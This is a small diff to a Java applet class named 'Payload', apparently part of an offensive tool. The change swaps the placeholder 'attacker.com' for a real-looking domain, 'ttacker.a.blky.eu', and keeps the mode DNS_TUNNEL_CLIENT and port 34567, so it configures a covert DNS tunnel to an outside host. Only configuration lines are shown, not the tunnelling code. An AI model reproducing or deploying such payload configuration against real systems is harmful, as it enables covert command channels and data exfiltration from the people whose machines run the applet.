@@ -1,3 +1,4 @@
+
 import java.applet.Applet;
 import java.awt.Graphics;
 
@@ -11,7 +12,7 @@ public class Payload extends Applet {
     }
 
     private final int port = 34567;
-    private final String domain = "attacker.com";
+    private final String domain = "ttacker.a.blky.eu";
     private final Mode mode = Mode.DNS_TUNNEL_CLIENT;
 
     public static void main(String[] args) {
